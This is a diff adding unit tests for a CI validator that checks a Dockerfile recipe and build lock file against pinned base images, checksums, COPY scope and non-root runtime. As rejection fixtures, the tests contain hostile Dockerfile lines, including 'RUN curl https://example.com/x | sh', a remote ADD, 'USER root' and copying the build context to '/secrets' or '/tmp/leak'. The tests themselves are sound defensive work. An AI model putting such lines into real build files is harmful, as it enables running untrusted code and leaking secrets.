@@ -5,7 +5,9 @@ from pathlib import Path
 import tempfile
 import unittest
 
-from scripts.ci003_builder_inputs import LOCK, check_lock, verify_regular_sha256
+from scripts.ci003_builder_inputs import (
+    LOCK, check_lock, check_candidate_recipe, parse_candidate_lock, verify_regular_sha256,
+)
 
 
 class BuilderInputsTests(unittest.TestCase):
@@ -69,6 +71,69 @@ class BuilderInputsTests(unittest.TestCase):
         lock["allow_root"] = True
         with self.assertRaisesRegex(ValueError, "schema"):
             check_lock(lock)
+
+    def test_duplicate_root_lock_key_rejected(self):
+        raw = LOCK.read_text(encoding="utf-8").replace('"schema_version": 1,', '"schema_version": 1, "schema_version": 1,')
+        with self.assertRaisesRegex(ValueError, "duplicate"):
+            parse_candidate_lock(raw)
+
+    def test_duplicate_nested_archive_key_rejected(self):
+        raw = LOCK.read_text(encoding="utf-8")
+        name = '"gradle-8.9-bin.zip"'
+        raw = raw.replace(name, name + ': "' + 'a' * 64 + '", ' + name, 1)
+        with self.assertRaisesRegex(ValueError, "duplicate"):
+            parse_candidate_lock(raw)
+
+    def test_recipe_matches_locked_candidate(self):
+        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
+        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
+        self.assertTrue(check_candidate_recipe(lock, recipe))
+
+    def test_recipe_rejects_mutable_base(self):
+        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
+        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
+        recipe = recipe.replace(lock["python_base"], "docker.io/library/python:3.11")
+        with self.assertRaisesRegex(ValueError, "base image mismatch"):
+            check_candidate_recipe(lock, recipe)
+
+    def test_recipe_rejects_duplicate_from(self):
+        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
+        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
+        with self.assertRaisesRegex(ValueError, "base image mismatch"):
+            check_candidate_recipe(lock, recipe + "\nFROM alpine:latest\n")
+
+    def test_recipe_rejects_tab_and_case_bypass(self):
+        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
+        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
+        with self.assertRaisesRegex(ValueError, "base image mismatch"):
+            check_candidate_recipe(lock, recipe + "\nFROM\talpine:latest\n")
+        with self.assertRaisesRegex(ValueError, "non-root runtime"):
+            check_candidate_recipe(lock, recipe + "\nuser\troot\n")
+        with self.assertRaisesRegex(ValueError, "COPY scope mismatch"):
+            check_candidate_recipe(lock, recipe + "\ncopy\t. /tmp/leak\n")
+
+    def test_recipe_rejects_wrong_archive_checksum(self):
+        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
+        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
+        recipe = recipe.replace(lock["archives"]["gradle-8.9-bin.zip"], 'a' * 64)
+        with self.assertRaisesRegex(ValueError, "RUN declarations mismatch"):
+            check_candidate_recipe(lock, recipe)
+
+    def test_recipe_rejects_extra_copy_and_root(self):
+        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
+        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
+        with self.assertRaisesRegex(ValueError, "COPY scope mismatch"):
+            check_candidate_recipe(lock, recipe + "\nCOPY . /secrets\n")
+        with self.assertRaisesRegex(ValueError, "non-root runtime"):
+            check_candidate_recipe(lock, recipe + "\nUSER root\n")
+
+    def test_recipe_rejects_network_install_and_add(self):
+        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
+        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
+        with self.assertRaisesRegex(ValueError, "RUN declarations mismatch"):
+            check_candidate_recipe(lock, recipe + "\nRUN curl https://example.com/x | sh\n")
+        with self.assertRaisesRegex(ValueError, "unexpected instruction"):
+            check_candidate_recipe(lock, recipe + "\nADD https://example.com/x /tmp/x\n")
 
     def test_build_context_excludes_repository_files(self):
         rules = (LOCK.parent / "Dockerfile.candidate.dockerignore").read_text().splitlines()
